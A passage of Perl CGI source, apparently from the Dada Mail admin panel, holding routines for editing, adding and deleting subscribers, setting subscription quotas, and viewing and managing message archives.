                            -Form       => 0
                           ));
                               
        
        
        my $should_add_to_black_list = 0; 
        
         $should_add_to_black_list = 1
            if ($li->{black_list} eq "1") && 
               ($li->{add_unsubs_to_black_list} eq "1");
               
               
               
        require DADA::Template::Widgets;
        print   DADA::Template::Widgets::screen({-list  => $list,
                                                -screen => 'filter_using_black_list.tmpl', 
                                                  -vars  => {
                                                  filtered          => $filtered, 
                                                  add_to_black_list => $should_add_to_black_list, 
                                                  
                                                  },
                                                }); 
        
        print(admin_template_footer(-List => $list, -Form => 0));




    }
}




sub edit_subscriber { 

    if (! $email){ 
        view_list();
        return; 
        
    }
	my $type = $q->param('type');
 	my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,    
                                                        -Function => 'edit_subscriber');
                                                        
    $list = $admin_list;
    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    my $lh = DADA::MailingList::Subscribers->new({-list => $list});
    
    if( $lh->check_for_double_email(-Email => $email, -Type => $type) == 0 ){ 
         print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?f=view_list&error=no_such_address&type=' . $type);
         return;
    } 
    
    if($process){ 
		if(!$root_login){ 
			die "You must be logged in with the Dada Mail Root Password to be able to edit a Subscriber's Profile Fields.";
		}
		my $new_fields = {}; 
		foreach my $nfield(@{$lh->subscriber_fields()}){
			if(defined($q->param($nfield))){ 
	            $new_fields->{$nfield} = $q->param($nfield); 
	        }
		}
		$lh->edit_subscriber(
	        {
	                -email  => $email, 
	                -type   => $type, 
	                -fields => $new_fields,      
	                -method => 'writeover',
	        }
	 	);
	
        $done = 1;
        
    }

            
           
           
    my $scrn = '';        
    $scrn .= admin_template_header(
				-Title       => "Edit Subscriber", 
                -List        => $list,
                -Root_Login  => $root_login,
			);

    
    my $fields = [];
    
    my $subscriber_info = $lh->get_subscriber({-email => $email, -type => $type}); 

    # DEV: This is repeated quite a bit...
	require DADA::ProfileFieldsManager; 
	my $pfm = DADA::ProfileFieldsManager->new;
	my $fields_attr = $pfm->get_all_field_attributes;
	foreach my $field(@{$lh->subscriber_fields()}){ 
        push(@$fields, 
			{
				name   => $field, 
				value => $subscriber_info->{$field}, 
				label => $fields_attr->{$field}->{label},
			}
		);
    }

    require DADA::Template::Widgets;
    $scrn .= DADA::Template::Widgets::screen({-screen => 'edit_subscribed_screen.tmpl', 
                                          -vars   => {
                                                        done                  => $done, 
                                                        email                 => $email, 

                                                        type                  => $type, 
                                                        type_title            => $type_title,
                                                        
                                                        fields                => $fields, 

                                                       root_login                       => $root_login, 

                                                        log_viewer_plugin_url => $DADA::Config::LOG_VIEWER_PLUGIN_URL, 

                                                  },
                                         });
                                         
    $scrn .= admin_template_footer(-List => $list); 
    
	print $scrn; 

}

sub add {

    my ( $admin_list, $root_login ) = check_list_security(
        -cgi_obj  => $q,
        -Function => 'add'
    );

    $list = $admin_list;

    my $lh = DADA::MailingList::Subscribers->new( { -list => $list } );
    my $fields = [];
    foreach my $field ( @{ $lh->subscriber_fields() } ) {
        push ( @$fields, { name => $field } );
    }


    if ( $q->param('process') ) {

        if ( $q->param('method') eq 'via_add_one' ) {

			# We're going to fake the, "via_textarea", buy just make a CSV file, and plunking it
			# in the, "new_emails" CGI param. (Hehehe);

            my @columns = ();
            push ( @columns, xss_filter( $q->param('email') ) );
            foreach ( @{ $lh->subscriber_fields() } ) {
                push ( @columns, xss_filter( $q->param($_) ) );
            }
            require Text::CSV;

            my $csv = Text::CSV->new($DADA::Config::TEXT_CSV_PARAMS);

            my $status =
              $csv->combine(@columns);    # combine columns into a string
            my $line = $csv->string();    # get the combined string

            $q->param( 'new_emails', $line );
            $q->param( 'method',     'via_textarea' );

            # End shienanengans.

        }

        if ( $q->param('method') eq 'via_file_upload' ) {
            if ( strip( $q->param('new_email_file') ) eq '' ) {
                print $q->redirect(
                    -uri => $DADA::Config::S_PROGRAM_URL . '?f=add' );
                return;
            }
        }
        elsif ( $q->param('method') eq 'via_textarea' ) {
            if ( strip( $q->param('new_emails') ) eq '' ) {
                print $q->redirect(
                    -uri => $DADA::Config::S_PROGRAM_URL . '?f=add' );
                return;
            }
        }

        # DEV: This whole building of query string is much too messy.
        my $qs = '&type='
          . $q->param('type')
          . '&new_email_file='
          . $q->param('new_email_file');
        if ( DADA::App::Guts::strip( $q->param('new_emails') ) ne "" ) {

          # DEV: why is it, "new_emails.txt"? Is that supposed to be a variable?
            my $outfile =
              make_safer( $DADA::Config::TMP . '/'
                  . $q->param('rand_string') . '-'
                  . 'new_emails.txt' );

            #	die $ENV{'QUERY_STRING'};
            #	die q{ $q->param('new_emails') } . $q->param('new_emails');

            open( OUTFILE, '>' . $outfile )
              or die ( "can't write to " . $outfile . ": $!" );

            print OUTFILE $q->param('new_emails');

        #require HTML::Entities;
        #print OUTFILE HTML::Entities::decode_entities($q->param('new_emails'));
            close(OUTFILE);
            chmod( 0666, $outfile );

            #	die ;

          # DEV: why is it, "new_emails.txt"? Is that supposed to be a variable?
            print $q->redirect( -uri => $DADA::Config::S_PROGRAM_URL
                  . '?f=add_email&fn='
                  . $q->param('rand_string') . '-'
                  . 'new_emails.txt'
                  . $qs );

        }
        else {

            if ( $q->param('method') eq 'via_file_upload' ) {
                upload_that_file($q);
            }
            my $filename = $q->param('new_email_file');
            $filename =~ s!^.*(\\|\/)!!;

            eval { require URI::Escape };
            if ( !$@ ) {
                $filename = URI::Escape::uri_escape( $filename, "\200-\377" );
            }
            else {
                warn('no URI::Escape is installed!');
            }
            $filename =~ s/\s/%20/g;

            print $q->redirect( -uri => $DADA::Config::S_PROGRAM_URL
                  . '?f=add_email&fn='
                  . $q->param('rand_string') . '-'
                  . $filename
                  . $qs );

        }
    }
    else {

        require DADA::MailingList::Settings;
        my $ls = DADA::MailingList::Settings->new( { -list => $list } );
        my $li = $ls->get;

        my $num_subscribers            = $lh->num_subscribers;
        my $subscription_quota_reached = 0;
        $subscription_quota_reached = 1
          if ( $li->{use_subscription_quota} == 1 )
          && ( $num_subscribers >= $li->{subscription_quota} )
          && ( $num_subscribers + $li->{subscription_quota} > 1 );

        my $list_type_switch_widget = $q->popup_menu(
            -name     => 'type',
            '-values' => [ keys %list_types ],
            -labels   => \%list_types,
            -default  => $type,
        );

        my $rand_string = generate_rand_string();

        my $fields = [];
        foreach my $field ( @{ $lh->subscriber_fields() } ) {
            push ( @$fields, { name => $field } );
        }

        my $scrn = (
            admin_template_header(
                -Title       => "Add",
                -List        => $list,
                -Root_Login  => $root_login,
                -Form        => 0
            )
        );

        require DADA::Template::Widgets;
        $scrn .= DADA::Template::Widgets::screen(
            {
                -screen => 'add_screen.tmpl',
                -vars   => {

                    screen => 'add',
                    title  => 'Manage Subscribers -> Add',

                    subscription_quota         => $li->{subscription_quota},
                    use_subscription_quota     => $li->{use_subscription_quota},
                    subscription_quota_reached => $subscription_quota_reached,
                    num_subscribers            => $num_subscribers,

                    list_type_isa_list => ( $type eq 'list' ) ? 1 : 0,
                    list_type_isa_black_list => ( $type eq 'black_list' ) ? 1
                    : 0,
                    list_type_isa_authorized_senders =>
                      ( $type eq 'authorized_senders' ) ? 1 : 0,
                    list_type_isa_testers => ( $type eq 'testers' ) ? 1 : 0,
                    list_type_isa_white_list => ( $type eq 'white_list' ) ? 1
                    : 0,

                    type       => $type,
                    type_title => $type_title,
                    flavor     => 'add',

                    rand_string => $rand_string,

                    enable_white_list => $li->{enable_white_list},

                    enable_authorized_sending =>
                      $li->{enable_authorized_sending},

                    list_subscribers_num =>
                      $lh->num_subscribers( -Type => 'list' ),
                    black_list_subscribers_num =>
                      $lh->num_subscribers( -Type => 'black_list' ),
                    white_list_subscribers_num =>
                      $lh->num_subscribers( -Type => 'white_list' ),
                    authorized_senders_num =>
                      $lh->num_subscribers( -Type => 'authorized_senders' ),

                    fields => $fields,

                    can_have_subscriber_fields =>
                      $lh->can_have_subscriber_fields,

                },
            }
        );

        $scrn .=  admin_template_footer( -List => $list ) ;
        print $scrn; 
    }

}

sub check_status {

    my $filename = $q->param('new_email_file');
    $filename =~ s{^(.*)\/}{};

    eval { require URI::Escape };
    if ( !$@ ) {
        $filename = URI::Escape::uri_escape( $filename, "\200-\377" );
    }
    else {
        warn('no URI::Escape is installed!');
    }
    $filename =~ s/\s/%20/g;

    if ( !-e $DADA::Config::TMP . '/' . $filename . '-meta.txt' ) {
        warn "no meta file at: "
          . $DADA::Config::TMP . '/'
          . $filename
          . '-meta.txt';
        print $q->header();
	}
    else {

        chmod( $DADA::Config::FILE_CHMOD,
            make_safer( $DADA::Config::TMP . '/' . $filename . '-meta.txt' ) );

        open my $META, '<',
          make_safer( $DADA::Config::TMP . '/' . $filename . '-meta.txt' )
          or die $!;

        my $s = do { local $/; <$META> };
        my ( $bytes_read, $content_length, $per ) = split ( '-', $s, 3 );
        close($META);

        my $small = 250 - ( $per * 2.5 );
        my $big   = $per * 2.5;

        print $q->header();
		require DADA::Template::Widgets; 
		print DADA::Template::Widgets::screen(
			{ 
				-screen => 'file_upload_status_bar_widget.tmpl', 
				-vars   => { 
					percent        => $per, 
					bytes_read     => $bytes_read, 
					content_length => $content_length, 
					big            => $big, 
					small          => $small, 
				}
			}
		);
		
    }
}

sub dump_meta_file {
    my $filename = $q->param('new_email_file');
    $filename =~ s{^(.*)\/}{};

    eval { require URI::Escape };
    if ( !$@ ) {
        $filename = URI::Escape::uri_escape( $filename, "\200-\377" );
    }
    else {
        warn('no URI::Escape is installed!');
    }
    $filename =~ s/\s/%20/g;

    my $full_path_to_filename =
      make_safer( $DADA::Config::TMP . '/' . $filename . '-meta.txt' );

	if(! -e $full_path_to_filename){ 
		
	}
	else { 
		
  	  my $chmod_check =
	      chmod( $DADA::Config::FILE_CHMOD, $full_path_to_filename );
	    if ( $chmod_check != 1 ) {
	        warn "could not chmod '$full_path_to_filename' correctly.";
	    }

	    my $unlink_check = unlink($full_path_to_filename);
	    if ( $unlink_check != 1 ) {
	        warn "deleting meta file didn't work for: " . $full_path_to_filename;
	    }
	}
}

sub generate_rand_string {

    #warn "generate_rand_string";

    my $chars = shift
      || 'aAeEiIoOuUyYabcdefghijkmnopqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789';
    my $num = shift || 1024;

    require Digest::MD5;

    my @chars = split '', $chars;
    my $ran;
    for ( 1 .. $num ) {
        $ran .= $chars[ rand @chars ];
    }
    return Digest::MD5::md5_hex($ran);
}

sub upload_that_file {

    # warn "upload_that_file";
    # my $q = shift;

    my $fh = $q->upload('new_email_file');

    # warn '$fh ' . $fh;

    my $filename = $q->param('new_email_file');
    $filename =~ s!^.*(\\|\/)!!;

    eval { require URI::Escape };
    if ( !$@ ) {
        $filename = URI::Escape::uri_escape( $filename, "\200-\377" );
    }
    else {
        warn('no URI::Escape is installed!');
    }
    $filename =~ s/\s/%20/g;

    # warn '$filename ' . $filename;

    # warn '$q->param(\'rand_string\') '    . $q->param('rand_string');
    # warn '$q->param(\'new_email_file\') ' . $q->param('new_email_file');
    return '' if !$filename;

    my $outfile =
      make_safer(
        $DADA::Config::TMP . '/' . $q->param('rand_string') . '-' . $filename );

    # warn ' $outfile ' . $outfile;

    open( OUTFILE, '>' . $outfile )
      or die ( "can't write to " . $outfile . ": $!" );

    while ( my $bytesread = read( $fh, my $buffer, 1024 ) ) {

        # warn $buffer;

        print OUTFILE $buffer;
    }

    close(OUTFILE);
    chmod( 0666, $outfile );

}

sub add_email {

    my ( $admin_list, $root_login ) = check_list_security(
        -cgi_obj  => $q,
        -Function => 'add_email'
    );
    $list = $admin_list;

    require DADA::MailingList::Settings;
    my $ls = DADA::MailingList::Settings->new( { -list => $list } );
    my $li = $ls->get;

    my $lh = DADA::MailingList::Subscribers->new( { -list => $list } );
    my $subscriber_fields = $lh->subscriber_fields;

    if ( !$process ) {

        my $new_emails_fn = $q->param('fn');

        my $new_emails = [];
        my $new_info   = [];

        ( $new_emails, $new_info ) =
          DADA::App::Guts::csv_subscriber_parse( $admin_list, $new_emails_fn );

        #require Data::Dumper;
        #die Data::Dumper::Dumper($new_info);

        my (
            $subscribed,       $not_subscribed, $black_listed,
            $not_white_listed, $invalid
          )
          = $lh->filter_subscribers_w_meta(
            {
                -emails => $new_info,
                -type   => $type
            }
          );

        my $num_subscribers = $lh->num_subscribers;

        my $going_over_quota = undef;

# and for some reason, this is its own subroutine...
# This is down here, so the status bar won't disapear before this page is loaded (or the below redirect)
        dump_meta_file();

        $going_over_quota = 1
          if ( ( $num_subscribers + $#$not_subscribed ) >=
            $li->{subscription_quota} )
          && ( $li->{use_subscription_quota} == 1 );

        my $addresses_to_add = 0;
        $addresses_to_add = 1
          if ( defined( @$not_subscribed[0] ) );

        my $field_names = [];
        foreach (@$subscriber_fields) {
            push ( @$field_names, { name => $_ } );
        }

        print admin_template_header(
            -Title      => "Verify Additions",
            -List       => $list,
            -Root_Login => $root_login,
        );
        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen(
            {
                -screen => 'add_email_screen.tmpl',
                -vars   => {

                    going_over_quota   => $going_over_quota,
                    field_names        => $field_names,
                    subscribed         => $subscribed,
                    not_subscribed     => $not_subscribed,
                    black_listed       => $black_listed,
                    not_white_listed   => $not_white_listed,
                    invalid            => $invalid,
                    subscription_quota => $li->{subscription_quota},
                    black_list         => $li->{black_list},
                    allow_admin_to_subscribe_blacklisted =>
                      $li->{allow_admin_to_subscribe_blacklisted},
                    enable_white_list => $li->{enable_white_list},
                    type_isa_list     => ( $type eq 'list' ) ? 1 : 0,
                    type              => $type,
                    type_title        => $type_title,
					'list_settings.enable_mass_subscribe'  => $li->{enable_mass_subscribe},
					root_login        => $root_login,  

                },
            }
        );
        print admin_template_footer( -List => $list );

    }
    else {

        if ( $process =~ /invite/i ) {
            &list_invite;
            return;
        }
        else {
	
			if(
				$li->{enable_mass_subscribe} != 1 && 
				$type eq 'list'
			){ 
				die "Mass Subscribing via the List Control Panel has been disabled."; 
			}

            my @address         = $q->param("address");
            my $new_email_count = 0;

            # Each Addres is a CSV line...
            foreach my $a (@address) {
                my $info = $lh->csv_to_cds($a);
                $lh->add_subscriber(
                    {
                        -email 		    => $info->{email},
                        -fields 		=> $info->{fields},
                        -type   		=> $type,
						-fields_options => {-mode => $q->param('fields_options_mode')},
                    }
                );

                $new_email_count++;
            }

            print $q->redirect( -uri => $DADA::Config::S_PROGRAM_URL
                  . '?flavor=view_list&email_count='
                  . $new_email_count
                  . '&type='
                  . $type );
        }
    }
}




sub delete_email{ 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'delete_email',
                                                       );
    $list = $admin_list; 
    
    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    my $lh = DADA::MailingList::Subscribers->new({-list => $list});
     
    if(!$process){ 
    
        print(admin_template_header(      
              -Title      => "Manage Deletions", 
              -List       => $list, 
              -Root_Login => $root_login,
              -Form       => 0
             ));
        
        require DADA::Template::Widgets; 
        print DADA::Template::Widgets::screen({-screen => 'delete_email_screen.tmpl',
        
                                              -vars => { 
                                              
														 screen => 'delete_email',
														 title  => 'Remove', 
														
                                                         can_use_global_black_list   => $lh->can_use_global_black_list, 
                                                         can_use_global_unsubscribe  => $lh->can_use_global_unsubscribe, 
                                                    
                                                        list_type_isa_list                  => ($type eq 'list')       ? 1 : 0, 
                                                        list_type_isa_black_list            => ($type eq 'black_list') ? 1 : 0, 
                                                        list_type_isa_authorized_senders    => ($type eq 'authorized_senders') ? 1 : 0, 
                                                        list_type_isa_testers               => ($type eq 'testers')    ? 1 : 0, 
                                                        list_type_isa_white_list            => ($type eq 'white_list') ? 1 : 0, 

                                                        type                        => $type, 
                                                        type_title                  => $type_title,
                                                        flavor                      => 'delete_email', 
                                                        enable_white_list           => $li->{enable_white_list}, 
                                                 
                                                        enable_authorized_sending   => $li->{enable_authorized_sending},
                                                        
                                                        list_subscribers_num            => $lh->num_subscribers(-Type => 'list'), 
                                                        black_list_subscribers_num      => $lh->num_subscribers(-Type => 'black_list'), 
                                                        white_list_subscribers_num      => $lh->num_subscribers(-Type => 'white_list'), 
                                                        authorized_senders_num          => $lh->num_subscribers(-Type => 'authorized_senders'), 
                                                        
                                              
                                              
                                              }
                                              
                                              }); 
                 
        print(admin_template_footer(-List => $list, -Form => 0));
    
    
    }else{ 

        my $delete_list = undef; 
        my $delete_email_file = $q->param('delete_email_file');    
        if($delete_email_file){    
            my $new_file = file_upload('delete_email_file');    
            
            open(UPLOADED, "$new_file") or die $!;
            
            $delete_list = do{ local $/; <UPLOADED> }; 
           
            
            close(UPLOADED);
        }else{ 
            $delete_list = $q->param('delete_list'); 
            
            #die $delete_list;


        }
    
    
        my @delete_addresses = split(/\n/, $delete_list);
        
        # xss filter... 
        foreach(@delete_addresses){ 
            $_ = xss_filter(strip($_)); 
        }
        
        # subscribed should give a darn if your blacklisted, or white listed, white list and blacklist only looks at unsubs. Right. Right?
        my ($subscribed, $not_subscribed, $black_listed, $not_white_listed, $invalid) 
			= $lh->filter_subscribers(
				{
					-emails => [@delete_addresses], 
					-type   => $type,
				}
			);
    
        my $should_add_to_black_list = 0; 
           $should_add_to_black_list = 1
            if ($li->{black_list} eq "1") && 
               ($li->{add_unsubs_to_black_list} eq "1");
        
        my $have_subscribed_addresses = 0; 
           $have_subscribed_addresses = 1
            if $subscribed->[0];
            
        my $addresses_to_remove = []; 
        push(@$addresses_to_remove, {email => $_})
            foreach @$subscribed; 
            
        my $not_subscribed_addresses = []; 
        push(@$not_subscribed_addresses, {email => $_}) 
            foreach @$not_subscribed; 
        
        my $have_invalid_addresses = 0; 
           $have_invalid_addresses = 1
            if $invalid->[0];
    
        my $invalid_addresses = [];
           push(@$invalid_addresses, {email => $_ }) 
            foreach @$invalid;
    
        print(admin_template_header(      
              -Title      => "Verify Deletions", 
              -List       => $list, 
              -Root_Login => $root_login,
              -Form       => 0, 
              
        ));
    

        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen({-screen => 'delete_email_screen_filtered.tmpl', 
                                              -vars   => {                                                                
                                                            should_add_to_black_list  => $should_add_to_black_list, 
                                                            have_subscribed_addresses => $have_subscribed_addresses, 
                                                            addresses_to_remove       => $addresses_to_remove, 
                                                            not_subscribed_addresses  => $not_subscribed_addresses, 
                                                            have_invalid_addresses    => $have_invalid_addresses, 
                                                            invalid_addresses         => $invalid_addresses, 
                                                            
                                                            type                        => $type, 
                                                            type_title                  => $type_title,
                                                        
                                                        },
                                             });

        print(admin_template_footer(-List => $list));
            
    }
}




sub subscription_options { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'subscription_options');
    $list = $admin_list;
    
    require  DADA::MailingList::Settings;
    my $ls = DADA::MailingList::Settings->new({-list => $list});
    my $li = $ls->get; 
    
    my @d_quota_values = qw(1 10 25 50 100 150 200 250 300 350 400 450 500 600 
                          700 800 900 1000 1500 2000 2500 3000 3500 4000 4500 
                          5000 5500 6000 6500 7000 7500 8000 8500 9000 9500 
                          10000 11000 12000 13000 14000 15000 16000 17000 
                          18000 19000 20000 30000 40000 50000 60000 70000 
                          80000 90000 100000 200000 300000 400000 500000 
                          600000 700000 800000 900000 1000000
                         );
    
    $DADA::Config::SUBSCRIPTION_QUOTA = undef if strip($DADA::Config::SUBSCRIPTION_QUOTA) eq ''; 
    my @quota_values; 
    
    if(defined($DADA::Config::SUBSCRIPTION_QUOTA)){ 
    
        foreach(@d_quota_values){ 
            if($_ < $DADA::Config::SUBSCRIPTION_QUOTA){ 
                push(@quota_values, $_); 
            }   
        }
        push(@quota_values, $DADA::Config::SUBSCRIPTION_QUOTA); 
        
    }
    else { 
        @quota_values = @d_quota_values; 
    }
    # Now that's a weird line (now)
    unshift(@quota_values, $li->{subscription_quota}); 
    
    
    if(!$process){ 
        
        my $subscription_quota_menu = $q->popup_menu(-name    => 'subscription_quota', 
                                                    '-values' => [@quota_values], 
                                                     -default => $li->{subscription_quota},
                                                    ); 
                                     
        print admin_template_header(-Title      => "Subscriber Options", 
                                -List       => $list,
                                -Root_Login => $root_login
                                 );    
    
        require DADA::Template::Widgets;
        print   DADA::Template::Widgets::screen(
					{
						-screen => 'subscription_options_screen.tmpl', 
						-vars   => {

							screen                  => 'subscription_options', 
							title                   => 'Subscriber Options', 

							done                    => $done, 
							use_subscription_quota  => $li->{use_subscription_quota}, 
							subscription_quota_menu => $subscription_quota_menu, 
							SUBSCRIPTION_QUOTA      => $DADA::Config::SUBSCRIPTION_QUOTA, 
						},
					}
				);
    
        print admin_template_footer(-List => $list);
        
    }else{ 
    
        my $use_subscription_quota = $q->param('use_subscription_quota') || 0; 
        my $subscription_quota     = $q->param('subscription_quota'); 
        
        $ls->save({
                    use_subscription_quota => $use_subscription_quota, 
                     subscription_quota => $subscription_quota,
                });
                
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?f=subscription_options&done=1');        
    } 

}




sub view_archive { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'view_archive');
                                                        
    $list = $admin_list;
    
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 


    my $ls = DADA::MailingList::Settings->new({-list => $admin_list}); 
    my $li = $ls->get; 
    
    
    # let's get some info on this archive, shall we? 
    require DADA::MailingList::Archives; 
           $DADA::MailingList::Archives::dbi_obj = $dbi_handle;
           
    my $archive = DADA::MailingList::Archives->new({-list => $list}); 
    my $entries = $archive->get_archive_entries(); 
    
    #if we don't have nothin, print the index, 
    unless(defined($id)){ 
    
        my $start = int($q->param('start')) || 0;


        if($c->cached($list . '.admin.view_archive.index.' . $start)){ $c->show($list . '.admin.view_archive.index.' . $start); return;}

            
        
        my $ht_entries = []; 
        
        #reverse if need be
        #@$entries = reverse(@$entries) if($li->{sort_archives_in_reverse} eq "1"); 
        
            
        my $th_entries = []; 
        
        my ($begin, $stop) = $archive->create_index($start);
        my $i;
        my $stopped_at = $begin;

        my @archive_nums; 
        my @archive_links; 
        
        for($i = $begin; $i <=$stop; $i++){ 
        
        next if !defined($entries->[$i]);


        my $entry = $entries->[$i];
        #foreach $entry (@$entries){ 
            my ($subject, $message, $format, $raw_msg) = $archive->get_archive_info($entry); 
  
            my $pretty_subject = pretty($subject);


                my $header_from    = undef; 
                if($raw_msg){ 
                    $header_from    = $archive->get_header(-header => 'From', -key => $entry); 
                    # The SPAM ME NOT Encoding's a little fucked for this, anyways, 
					# We should only encode the actual address, anyways. Hmm...
					# $header_from    = spam_me_not_encode($header_from);
                }else{ 
                    $header_from    = '-';
                }
             

             my $date = date_this(
                -Packed_Date  => $entry,
                -Write_Month => $li->{archive_show_month},
                -Write_Day => $li->{archive_show_day},
                -Write_Year => $li->{archive_show_year},
                -Write_H_And_M => $li->{archive_show_hour_and_minute},
                -Write_Second => $li->{archive_show_second},
                );
                                           
             my $message_blurb = $archive->message_blurb(-key => $entry); 
                $message_blurb =~ s/\n|\r/ /g; 
                
             push(@$ht_entries, 
             
             { 
               id            => $entry, 
               date          => $date, 
               S_PROGRAM_URL => $DADA::Config::S_PROGRAM_URL, 
               subject       => $pretty_subject, 
               from          => $header_from,
               message_blurb => $message_blurb, 
             });
             
             $stopped_at++;
             
        }               
        
    my $index_nav = $archive->create_index_nav($stopped_at, 1);

    my $scrn; 
    
    $scrn .= (admin_template_header(      
              -Title      => "View Archive", 
              -List       => $li->{list},
              -Root_Login => $root_login,
              -Form       => 0, 
            ));
    
    
        require DADA::Template::Widgets;
        $scrn .=  DADA::Template::Widgets::screen(
					{
						-screen => 'view_archive_index_screen.tmpl',
                        -list       => $list, 
                        -vars       =>  {
	
							screen     => 'view_archive',
							title      => 'View Archive',
                       		index_list => $ht_entries, 
	                        list_name  => $li->{list_name}, 
	                        index_nav  => $index_nav, 
	
						}, 
                     }
				);                

    
    
         
        $scrn .= (admin_template_footer(-List => $list, , -Form => 0));
        e_print($scrn); 
        
        $c->cache($list . '.admin.view_archive.index.' . $start, \$scrn);

        return; 

    }else{ 


    #check to see if $id is a real id key 
    my $entry_exists = $archive->check_if_entry_exists($id); 
    
    if($entry_exists <= 0){
        user_error(-List => $list, -Error => "no_archive_entry"); 
        return; 
     }

    # if we got something, print that entry. 
    print(admin_template_header(      
          -Title      => "Manage Archives", 
          -List       => $li->{list},
          -Root_Login => $root_login));


    
    if($c->cached('view_archive.' . $list . '.' . $id)){ $c->show('view_archive.' . $list . '.' . $id); return;}

    
    my $scrn = ''; 
    
    #get the archive info 

    my ($subject, $message, $format) = $archive->get_archive_info($id); 



    my $pretty_subject = pretty($subject);  
    
    $scrn .= "<h2>$pretty_subject</h2>";
    my $cal_date = date_this(-Packed_Date => $archive->_massaged_key($id), -All => 1); 

    $scrn .=  "<p><em>Sent $cal_date</em></p> "; 

    if($archive->can_display_message_source){ 
    
        $scrn .=  qq{<p style="text-align:right">
                <a href="$DADA::Config::PROGRAM_URL?f=display_message_source&amp;id=$id" target="_blank"> 
                 Display Original Message Source
                </a>
               </p>}; 
    
    }

    
        $scrn .=  qq{<p style="text-align:right">
                <a href="$DADA::Config::PROGRAM_URL/archive/$list/$id/" target="_blank"> 
                 Display publically viewable version of this message
                </a>
               </p>}; 
        
    

    $scrn .=  qq{<iframe src="$DADA::Config::S_PROGRAM_URL?f=archive_bare;l=$list;id=$id;admin=1" id="archived_message_body_container">};
    $scrn .=  $archive->massaged_msg_for_display(-key => $id, -body_only => 1); 
    $scrn .=  '</iframe>'; 



$scrn .=  <<EOF 

    <hr /> 


<p class="error">Note: some archiving formatting options only take affect when viewing messages publically.</p>



EOF
; 


$scrn .=  qq{ 

<div class="buttonfloat">

}; 

    $scrn .=  qq{ 
     <input type="button" class="cautionary"  value="Edit Message..." onClick="window.location='$DADA::Config::PROGRAM_URL?f=edit_archived_msg&id=$id'" />    
    }; 

$scrn .=  qq{ 
 <input type="button" class="alertive" " name="process" value="Delete Message" onClick="window.location='$DADA::Config::PROGRAM_URL?flavor=delete_archive&address=$id'" />

}; 

$scrn .=  qq{ 

</div>
<br />
<div class="floatclear"></div>
}; 







my $nav_table = $archive -> make_nav_table(-Id => $id, -List => $li->{list}, -Function => "admin"); 
$scrn .=  "<center>$nav_table</center>";




    $scrn .= (admin_template_footer(-List => $list));
    
    e_print($scrn); 
    $c->cache('view_archive.' . $list . '.' . $id, \$scrn); 
    
    
    return; 
    
    
    
    }
}




sub display_message_source { 


    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'display_message_source');
                                                        
    $list = $admin_list; 
    
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    require DADA::MailingList::Archives;
           $DADA::MailingList::Archives::dbi_obj = $dbi_handle;
           
    my $la = DADA::MailingList::Archives->new({-list => $list}); 
    
    
    if($la->check_if_entry_exists($q->param('id'))){
    
        if($la->can_display_message_source){ 
        
            print $q->header('text/plain'); 
            $la->print_message_source(\*STDOUT, $q->param('id')); 

        }else{

            user_error(-List => $list, -Error => "no_support_for_displaying_message_source");
            return; 
        }
    
    
    } else { 
    
        user_error(-List => $list, -Error => "no_archive_entry");
        return; 
    }    

}


sub delete_archive { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                       -Function => 'delete_archive');
                                                       
    $list = $admin_list;
    my @address = $q->param("address"); 

    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    require DADA::MailingList::Archives;
           $DADA::MailingList::Archives::dbi_obj = $dbi_handle;
    
    my $archive = DADA::MailingList::Archives->new({-list => $list}); 
       $archive->delete_archive(@address);
    
    print $q->redirect(-uri=>"$DADA::Config::S_PROGRAM_URL?flavor=view_archive"); 

}




sub purge_all_archives { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'purge_all_archives');

    $list = $admin_list;

    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 

    require  DADA::MailingList::Archives; 
    my $ah = DADA::MailingList::Archives->new({-list => $list}); 

    $ah->delete_all_archive_entries(); 
    
    print $q->redirect(-uri=>$DADA::Config::S_PROGRAM_URL . '?flavor=view_archive');

}






sub archive_options { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'archive_options'); 


    $list = $admin_list; 
    
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
        if(!$process){ 
            
			my $can_use_captcha = 0; 
			eval { require DADA::Security::AuthenCAPTCHA; };
			if(!$@){ 
				$can_use_captcha = 1;        
			}	


        
        print(admin_template_header(      
              -Title      => "Archive Options", 
              -List       => $list,
              -Root_Login => $root_login 
        ));
         
        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen({-screen => 'archive_options_screen.tmpl',
                                              -expr   => 1, 
                                              -vars   => {
													screen                    => 'archive_options', 
													title                     => 'Archive Options', 
                                                    list                      => $list, 
                                                    done                      => $done, 
                                                    can_use_captcha           => $can_use_captcha,
                                                    CAPTCHA_TYPE              => $DADA::Config::CAPTCHA_TYPE, 
                                                        
                                                   },
												-list_settings_vars_param => { 
													-list    => $list,
													-dot_it => 1, 
												},
												
                                             });
                                             
        print(admin_template_footer(-List => $list));

    }else{ 

        my $show_archives             = xss_filter($q->param('show_archives'))             || 0;
